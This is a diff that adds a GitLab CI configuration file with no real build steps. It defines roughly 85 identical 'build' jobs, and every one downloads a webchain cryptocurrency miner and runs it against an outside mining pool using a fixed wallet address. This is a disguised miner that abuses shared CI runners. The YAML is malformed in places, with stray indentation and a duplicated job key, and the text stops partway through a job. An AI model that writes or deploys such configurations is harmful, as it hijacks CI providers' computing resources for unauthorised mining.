@@ -1,0 +1,736 @@
+image: golang:latest
+
+variables:
+  REPO_NAME: gitlab.com/upx4ku/oke
+
+stages:
+  - build
+  - test
+  - deploy
+
+mintme_1:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_2:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_3:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_4:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_5:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_6:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_7:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_8:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+mintme_9:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_10:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_11:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_12:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_13:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_14:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_15:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_16:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_17:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_18:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_19:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_20:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_21:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_22:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_23:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_24:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_25:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_26:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_27:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_28:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_29:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_30:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_31:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_32:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_33:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_34:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_35:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_36:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_37:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_39:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_40:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_41:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_42:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_43:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_44:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_45:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_46:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_47:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_48:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_49:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_50:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_51:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_52:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_53:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_54:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_55:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+ mintme_56:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_57:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_58:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+mintme_59:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_60:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+
+mintme_61:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_62:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_63:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+
+mintme_64:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_65:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+
+mintme_66:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_67:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+ mintme_68:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+  mintme_69:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+  mintme_69:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+  mintme_70:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+mintme_71:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+  
+mintme_72:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+ 
+ mintme_73:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+mintme_74:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+  mintme_75:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+  mintme_76:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    
+    mintme_77:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    mintme_78:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    
+    mintme_79:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    mintme_80:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    
+    mintme_81:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    mintme_82:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    mintme_83:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_84:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+    mintme_85:
+  stage: build
+  script:
+    - wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+    - tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz
+    - ./webchain-miner -o web-ko1.gonspool.com:3333 -u 0xda80db854613e908434cd172682fd70e76419024 -p x
+    
+    
+     mintme_86:
+  stage: build
